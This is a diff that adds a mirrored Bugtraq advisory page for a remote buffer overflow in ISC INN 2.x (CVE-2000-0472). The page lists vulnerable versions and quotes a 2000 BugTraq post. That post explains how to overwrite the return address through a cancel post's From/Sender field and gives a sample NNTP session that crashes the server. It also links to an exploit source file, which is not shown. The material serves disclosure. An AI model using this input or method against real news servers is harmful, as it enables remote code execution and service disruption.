@@ -1,0 +1,169 @@
+#SpeeDr00t@Black Falcon<br>#bid1316<p><b><span style="font-size: 18pt;">ISC innd 2.x Remote Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1316/info">info</a><br><a href="http://www.securityfocus.com/bid/1316/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1316/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1316/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1316/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1316
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2000-0472<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 06 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 19 2015 08:15AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Posted to BugTraq on June 6, 2000 by Michal Zalewski &lt;lcamtuf@tpi.pl&gt;
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					ISC INN 2.2.2 <br/>
+					
+				
+					ISC INN 2.2.1 <br/>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.3 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.2 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.1 alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 5.3 <br/>
+</span>
+					
+				
+					ISC INN 2.2 <br/>
+					
+				
+					ISC INN 2.1 <br/>
+					
+				
+					ISC INN 2.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					ISC INN 1.7.2 <br/>
+					
+				
+					ISC INN 1.7 <br/>
+					
+				
+					ISC INN 1.5.1 <br/>
+					
+				
+					ISC INN 1.5 <br/>
+					
+				
+					ISC INN 1.4 unoff4<br/>
+					
+				
+					ISC INN 1.4 unoff3<br/>
+					
+				
+					ISC INN 1.4 sec2<br/>
+					
+				
+					ISC INN 1.4 sec<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x2000/1316/inndexploit.c">#exploit_inndexploit.c</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following exploit description was posted to BugTraq on June 6, 2000 by Michal Zalewski &lt;lcamtuf@tpi.pl&gt;:<br/><br/>How to exploit it? It could be a problem for script kiddies, as Message-ID is strictly checked for non-printable characters etc. But hey, Message-ID can be used only as a padding, and then we can overwrite return address with From/Sender address of cancel post! This field is not verified in any fascist way. Shellcode? Can be placed anywhere, quite big portions of cancel post are lying in the accessible memory when overflow happens.<br/><br/>Sample input ("LONGBUFFER" = around 500-600 bytes of AAAs..., has to be the same every time):<br/><br/>-- input -<br/>201 XXX InterNetNews NNRP server INN 2.2 23-Oct-1998 ready (posting ok)<br/>mode reader<br/>group pl.test<br/>post<br/>Message-ID: &lt;none@LONGBUFFER&gt;<br/>From: &lt;test@polbox.com&gt;<br/>Sender: &lt;test@polbox.com&gt;<br/>Newsgroups: pl.test<br/><br/>testing<br/>.               &lt;- single dot, comment to avoid mail transfer problems<br/>group control<br/>post<br/>Message-ID: &lt;some-random-msgid@test.pl&gt;<br/>Approved: &lt;approver@approving.net&gt;From: &lt;sucker@free.net.pl&gt;<br/>Sender: &lt;sucker@free.net.pl&gt;<br/>Control: cancel &lt;none@LONGBUFFER&gt;<br/>Subject: cmsg cancel &lt;none@LONGBUFFER&gt;<br/>Newsgroups: control<br/><br/>Damn, cancel it.<br/>.                       &lt;- single dot<br/>quit<br/>-- EOF --<br/><br/>If innd/nnrp is running under debugger like strace, you'll see that child process responsible for request handling dies with SIGSEGV. Nice.
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/inndexploit.c">/data/vulnerabilities/exploits/inndexploit.c</a></li>
+</ul>
+</div>
